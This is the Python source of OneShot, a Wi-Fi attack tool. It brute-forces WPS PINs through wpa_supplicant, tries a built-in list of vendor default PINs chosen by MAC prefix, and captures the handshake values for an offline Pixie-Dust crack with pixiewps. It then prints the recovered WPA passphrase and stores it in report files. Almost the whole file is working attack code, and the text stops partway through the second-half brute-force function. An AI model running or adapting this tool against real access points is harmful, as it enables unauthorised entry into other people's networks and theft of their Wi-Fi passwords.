#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AutoShot / OneShot – WPS brute‑force and Pixie‑Dust tool
Robust version with security fixes, timeouts, and clean error handling.
Original by rofl0r, drygdryg; optimised by community.
"""

import sys
import subprocess
import os
import tempfile
import shutil
import re
import socket
import pathlib
import time
import collections
import statistics
import csv
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional, List
import wcwidth


# ---------- Constants ----------
WPA_SUPPLICANT_TIMEOUT = 30  # seconds to wait for each WPS transaction


# ---------- Helper: binary check ----------
def _check_binary(name: str) -> bool:
    """Return True if binary exists in PATH."""
    return shutil.which(name) is not None


# ---------- NetworkAddress class (unchanged) ----------
class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other
        return self

    def __isub__(self, other):
        self.integer -= other
        return self

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return f'NetworkAddress(string={self._str_repr}, integer={self._int_repr})'


# ---------- WPSpin generator (unchanged) ----------
class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}

    @staticmethod
    def checksum(pin):
        """Standard WPS checksum algorithm."""
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        return [self.generate(ID, mac) for ID, algo in self.algos.items()
                if not (algo['mode'] == self.ALGO_STATIC and not get_static)]

    def getSuggested(self, mac):
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        return [pin['pin'] for pin in self.getSuggested(mac)]

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        return res[0] if res else None

    def _suggest(self, mac):
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            for mask in masks:
                if mac.startswith(mask):
                    res.append(algo_id)
                    break
        return res

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


# ---------- Data containers ----------
class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return all([self.pke, self.pkr, self.e_nonce, self.authkey, self.e_hash1, self.e_hash2])

    def get_pixie_cmd(self, full_range=False):
        cmd = ["pixiewps",
               "--pke", self.pke,
               "--pkr", self.pkr,
               "--e-hash1", self.e_hash1,
               "--e-hash2", self.e_hash2,
               "--authkey", self.authkey,
               "--e-nonce", self.e_nonce]
        if full_range:
            cmd.append("--force")
        return cmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.bssid = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        if not self.attempts_times:
            return
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print(f'[*] {percentage:.2f}% complete @ {self.start_time} ({average_pin_time:.2f} seconds/pin)')

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


# ---------- Core Companion class ----------
class Companion:
    def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write(f'ctrl_interface={self.tempdir}\nctrl_interface_group=root\nupdate_config=1\n')
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self._init_wpa_supplicant()

        # Create Unix domain socket for wpa_supplicant communication
        self.res_socket_file = os.path.join(tempfile.gettempdir(), f"oneshot_{os.getpid()}_{int(time.time())}")
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM) if hasattr(socket, 'AF_UNIX') else None
        if self.retsock:
            self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()
        self.bruteforce = None

        user_home = str(pathlib.Path.home())
        self.sessions_dir = os.path.join(user_home, '.OneShot', 'sessions')
        self.pixiewps_dir = os.path.join(user_home, '.OneShot', 'pixiewps')
        self.reports_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'reports')
        for d in [self.sessions_dir, self.pixiewps_dir, self.reports_dir]:
            os.makedirs(d, exist_ok=True)

        self.generator = WPSpin()
        self.bssid = bssid
        self.lastPwr = 0

    def _init_wpa_supplicant(self):
        print('[*] Running wpa_supplicant…')
        cmd = [
            'wpa_supplicant',
            '-K', '-d',
            '-Dnl80211,wext,hostapd,wired',
            '-i', self.interface,
            '-c', self.tempconf
        ]
        self.wpas = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            encoding='utf-8',
            errors='replace'
        )
        timeout = 10
        start = time.time()
        while not os.path.exists(self.wpas_ctrl_path):
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise RuntimeError('wpa_supplicant failed to start: ' + self.wpas.communicate()[0])
            if time.time() - start > timeout:
                raise TimeoutError('wpa_supplicant did not create control socket')
            time.sleep(0.1)

    def send_only(self, command):
        if self.retsock:
            self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def send_and_receive(self, command):
        if not self.retsock:
            raise RuntimeError("Socket not available on this platform")
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        b, _ = self.retsock.recvfrom(4096)
        return b.decode('utf-8', errors='replace')

    def _get_hex_from_line(self, line):
        parts = line.split(':', 3)
        return parts[2].replace(' ', '').upper()

    def _parse_wps_line(self, line, pixiemode=False, pbc_mode=False, bssid=''):
        """Parse a single line from wpa_supplicant output."""
        if not line:
            return False

        if self.print_debug:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                print(f'[*] Sending WPS Message M{n}…')
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                print(f'[*] Received WPS Message M{n}')
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                print('[*] Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = self._get_hex_from_line(line)
                if pixiemode:
                    print(f'[P] E-Nonce: {self.pixie_creds.e_nonce}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = self._get_hex_from_line(line)
                if pixiemode:
                    print(f'[P] PKR: {self.pixie_creds.pkr}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = self._get_hex_from_line(line)
                if pixiemode:
                    print(f'[P] PKE: {self.pixie_creds.pke}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = self._get_hex_from_line(line)
                if pixiemode:
                    print(f'[P] AuthKey: {self.pixie_creds.authkey}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = self._get_hex_from_line(line)
                if pixiemode:
                    print(f'[P] E-Hash1: {self.pixie_creds.e_hash1}')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = self._get_hex_from_line(line)
                if pixiemode:
                    print(f'[P] E-Hash2: {self.pixie_creds.e_hash2}')
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                raw = bytes.fromhex(self._get_hex_from_line(line))
                self.connection_status.wpa_psk = raw.decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                print('[*] Scanning…')
        elif 'WPS-FAIL' in line and self.connection_status.status != '':
            self.connection_status.status = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                parts = line.split("'")
                if len(parts) >= 3:
                    self.connection_status.essid = parts[1]
            print('[*] Authenticating…')
        elif 'Authentication response' in line:
            print('[*] Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                parts = line.split("'")
                if len(parts) >= 3:
                    self.connection_status.essid = parts[1]
            print('[*] Associating with AP…')
        elif 'Associated with' in line and self.interface in line:
            bssid_from_line = line.split()[-1].upper()
            if self.connection_status.essid:
                print(f'[+] Associated with {bssid_from_line} (ESSID: {self.connection_status.essid})')
            else:
                print(f'[+] Associated with {bssid_from_line}')
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print('[*] Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print('[*] Received Identity Request')
        elif 'using real identity' in line:
            print('[*] Sending Identity Response…')
        elif bssid and bssid in line and 'level=' in line:
            parts = line.split('level=')
            if len(parts) > 1:
                self.lastPwr = parts[1].split(' ')[0]
        elif pbc_mode and 'selected BSS ' in line:
            bssid_from_line = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid_from_line
            print(f'[*] Selected AP: {bssid_from_line}')
        return True

    def _wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False):
        """Perform WPS connection with given pin or PBC."""
        self.pixie_creds.clear()
        self.connection_status.clear()
        bssid = bssid or ''
        # Flush pipe
        if self.wpas and self.wpas.stdout:
            self.wpas.stdout.read(300)

        if pbc_mode:
            if bssid:
                print(f"[*] Starting WPS push button connection to {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                print("[*] Starting WPS push button connection…")
                cmd = 'WPS_PBC'
        else:
            print(f"[*] Trying PIN '{pin}'…")
            cmd = f'WPS_REG {bssid} {pin}'

        r = self.send_and_receive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(self._explain_wpas_error(cmd, r))
            return False

        start_time = time.time()
        while True:
            if not self.wpas or not self.wpas.stdout:
                break
            line = self.wpas.stdout.readline()
            if not line:
                if self.wpas:
                    self.wpas.wait()
                break
            self._parse_wps_line(line.rstrip('\n'), pixiemode, pbc_mode, bssid)
            if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break
            if time.time() - start_time > WPA_SUPPLICANT_TIMEOUT:
                print(f'[!] Timeout after {WPA_SUPPLICANT_TIMEOUT} seconds')
                self.connection_status.status = 'WPS_FAIL'
                break

        self.send_only('WPS_CANCEL')
        return self.connection_status.status == 'GOT_PSK'

    def _explain_wpas_error(self, command, respond):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] wpa_supplicant lacks WPS support. '
                        'Rebuild with CONFIG_WPS=y')
        return '[!] Something went wrong — check debug log (-v)'

    def _run_pixiewps(self, showcmd=False, full_range=False):
        print('[*] Running Pixiewps…')
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(' '.join(cmd))
        r = subprocess.run(cmd, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT,
                           encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if '[+]' in line and 'WPS pin' in line:
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        return ''
                    return pin
        return None

    def _credential_print(self, wps_pin, wpa_psk, essid):
        print(f"[+] WPS PIN: '{wps_pin}'")
        print(f"[+] WPA PSK: '{wpa_psk}'")
        print(f"[+] AP SSID: '{essid}'")

    def _save_result(self, bssid, essid, wps_pin, wpa_psk):
        os.makedirs(self.reports_dir, exist_ok=True)
        base = os.path.join(self.reports_dir, 'stored')
        date_str = datetime.now().strftime("%d.%m.%Y %H:%M")

        with open(base + '.txt', 'a', encoding='utf-8') as f:
            f.write(f'{date_str}\nBSSID: {bssid}\nESSID: {essid}\nWPS PIN: {wps_pin}\nWPA PSK: {wpa_psk}\n\n')

        header = not os.path.isfile(base + '.csv')
        with open(base + '.csv', 'a', newline='', encoding='utf-8') as f:
            csv_writer = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
            if header:
                csv_writer.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csv_writer.writerow([date_str, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Credentials saved to {base}.txt, {base}.csv')

    def _save_pin(self, bssid, pin):
        filename = os.path.join(self.pixiewps_dir, f"{bssid.replace(':', '').upper()}.run")
        with open(filename, 'w') as f:
            f.write(pin)
        print(f'[i] PIN saved in {filename}')

    def _prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            print(f'PINs generated for {bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin_info in enumerate(pins):
                number = f'{i+1})'
                print(f'{number:<3} {pin_info["pin"]:<10} {pin_info["name"]}')
            while True:
                choice = input('Select the PIN: ')
                try:
                    idx = int(choice) - 1
                    if 0 <= idx < len(pins):
                        return pins[idx]['pin']
                except (ValueError, IndexError):
                    print('Invalid number')
        elif len(pins) == 1:
            print(f'[i] The only probable PIN is selected: {pins[0]["name"]}')
            return pins[0]['pin']
        return None

    def single_connection(self, bssid, pin=None, pixiemode=False, pbc_mode=False,
                          showpixiecmd=False, pixieforce=False, store_pin_on_fail=False):
        """Attempt a single WPS connection."""
        if not pin:
            if pixiemode:
                saved_file = os.path.join(self.pixiewps_dir, f"{bssid.replace(':', '').upper()}.run")
                if os.path.isfile(saved_file):
                    with open(saved_file, 'r') as f:
                        t_pin = f.readline().strip()
                    if input(f'[?] Use previously calculated PIN {t_pin}? [n/Y] ').lower() != 'n':
                        pin = t_pin
                if not pin:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                pin = self._prompt_wpspin(bssid) or '12345670'

        success = self._wps_connection(bssid, pin, pixiemode, pbc_mode)

        if self.connection_status.status == 'GOT_PSK':
            self._credential_print(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self._save_result(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            # Remove temporary PIN file if any
            saved_file = os.path.join(self.pixiewps_dir, f"{bssid.replace(':', '').upper()}.run")
            try:
                os.remove(saved_file)
            except FileNotFoundError:
                pass
            return True

        elif pixiemode and self.pixie_creds.got_all():
            pin = self._run_pixiewps(showpixiecmd, pixieforce)
            if pin is not None:
                return self.single_connection(bssid, pin, pixiemode=False,
                                              store_pin_on_fail=True)
            return False
        else:
            if store_pin_on_fail and pin:
                self._save_pin(bssid, pin)
            return False

    def _first_half_bruteforce(self, bssid, f_half, delay=None):
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = f'{f_half}000{checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print('[+] First half found')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self._first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            if self.bruteforce:
                self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print('[-] First half not found')
        return False

    def _second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
